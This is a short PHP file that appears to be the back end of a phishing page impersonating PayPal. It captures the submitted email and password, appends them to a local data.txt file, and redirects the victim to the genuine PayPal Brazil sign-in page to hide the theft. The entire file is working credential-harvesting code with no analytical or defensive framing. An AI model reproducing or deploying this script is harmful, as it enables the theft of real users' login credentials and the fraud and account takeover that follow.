<?php

header ('Location: https://www.paypal.com/br/signin');

$email = $_POST['login_email'];
$password = $_POST['login_password'];


  $open = fopen('data.txt','a');
  fwrite($open,$email);
  fwrite($open, '::');
  fwrite($open,$password);
  fwrite($open, ' |||| ');


?>